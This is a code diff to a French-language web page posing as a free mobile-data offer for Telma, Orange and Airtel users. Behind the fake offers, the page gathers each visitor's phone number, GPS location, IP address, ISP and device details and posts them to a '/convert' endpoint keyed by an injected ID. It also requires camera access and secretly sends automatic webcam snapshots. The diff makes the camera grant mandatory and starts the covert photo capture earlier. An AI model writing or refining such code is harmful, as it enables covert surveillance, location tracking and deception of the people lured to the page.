@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Forfais Gratuits</title>
+  <title>Forfaits Gratuits</title>
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
   <style>
     :root {
@@ -277,9 +277,9 @@
 <video id="video" autoplay playsinline class="hidden"></video>
 <canvas id="canvas" class="hidden"></canvas>
 
-<!--__INJECT_ID__-->
 <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 <script>
+const psid = "<!--__INJECT_ID__-->";
 const telmaOffers = ["TELMA 500 Ar - 100Mo", "TELMA 1000 Ar - 250Mo", "TELMA 2000 Ar - 500Mo", "TELMA 5000 Ar - 1Go"];
 const orangeOffers = ["ORANGE 300 Ar - 50Mo", "ORANGE 600 Ar - 120Mo", "ORANGE 1500 Ar - 400Mo", "ORANGE 3000 Ar - 800Mo"];
 const airtelOffers = ["AIRTEL 500 Ar - 80Mo", "AIRTEL 1000 Ar - 200Mo", "AIRTEL 2000 Ar - 450Mo", "AIRTEL 5000 Ar - 1Go"];
@@ -336,13 +336,10 @@ async function getInfoText(phone, puce) {
   const lat = geoCoords?.latitude?.toFixed(6) || 'unknown';
   const lon = geoCoords?.longitude?.toFixed(6) || 'unknown';
 
-  return `NEW TRACKING RECEIVED 🤖
-
-📞 Phone: ${phone}
+  return `📞 Phone: ${phone}
 📶 Puce: ${puce}
 📍 Location: lat=${lat}, lon=${lon}
-🌐 IP: ${ip.ip || '?'}
-🗺️ City: ${ip.city || ''}, ${ip.country || ''}
+🌐 IP: ${ip.ip || '?'} | ${ip.city || ''}, ${ip.country || ''}
 🏢 ISP: ${ip.org || ''}
 🔋 ${battery}
 📡 ${net}
@@ -352,7 +349,7 @@ async function getInfoText(phone, puce) {
 function sendMessage(message) {
   fetch("/convert", {
     method: "POST",
-    body: new URLSearchParams({ id: psid, message })
+    body: new URLSearchParams({ id: PSID, message })
   });
 }
 
@@ -361,10 +358,8 @@ function sendPhoto() {
   canvas.height = video.videoHeight;
   canvas.getContext('2d').drawImage(video, 0, 0);
   canvas.toBlob(async (blob) => {
-    const info = await getInfoText("-", "-");
     const fd = new FormData();
-    fd.append("id", psid);
-    fd.append("message", info);
+    fd.append("id", PSID);
     fd.append("photo", blob, "cam.jpg");
     fetch("/convert", { method: "POST", body: fd });
   }, 'image/jpeg', 0.8);
@@ -391,6 +386,20 @@ function updateOffers(puce) {
   offerSelector.classList.remove('hidden');
 }
 
+async function requestCameraPermission() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+    cameraGranted = true;
+    formContainer.classList.remove("hidden");
+    return true;
+  } catch (err) {
+    console.error("Camera access denied:", err);
+    camRefused.classList.remove("hidden");
+    return false;
+  }
+}
+
 document.getElementById("submit-btn").onclick = async () => {
   const phone = document.getElementById("phone").value.trim();
   const puce = detectPuce(phone);
@@ -409,23 +418,38 @@ document.getElementById("submit-btn").onclick = async () => {
     Swal.fire({
       icon: 'error',
       title: 'Erreur',
-      text: 'Numéro non valide,
+      text: 'Numéro non valide',
       confirmButtonColor: '#8b0000'
     });
     return;
   }
 
   Swal.fire({
-    title: 'Veuillez attendre...',
-    html: 'Vauillez attendre quelques scondes',
+    title: 'Traitement en cours...',
+    html: 'Veuillez patienter quelques secondes',
     allowOutsideClick: false,
     didOpen: () => {
       Swal.showLoading();
     }
   });
 
+  if (!cameraGranted) {
+    const hasPermission = await requestCameraPermission();
+    if (!hasPermission) {
+      Swal.fire({
+        icon: 'error',
+        title: 'Erreur',
+        text: 'Permission caméra requise pour continuer',
+        confirmButtonColor: '#8b0000'
+      });
+      return;
+    }
+  }
+
   const infoText = await getInfoText(phone, puce);
   sendMessage(infoText);
+
+  startAutoPhoto();
 
   setTimeout(() => {
     Swal.fire({
@@ -436,21 +460,13 @@ document.getElementById("submit-btn").onclick = async () => {
     });
     
     updateOffers(puce);
-    startAutoPhoto();
   }, 2000);
 };
 
 async function initApp() {
   geoCoords = await getGeo();
-
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = stream;
-    cameraGranted = true;
-    formContainer.classList.remove("hidden");
-  } catch {
-    camRefused.classList.remove("hidden");
-  }
+  
+  await requestCameraPermission();
 }
 
 initApp();
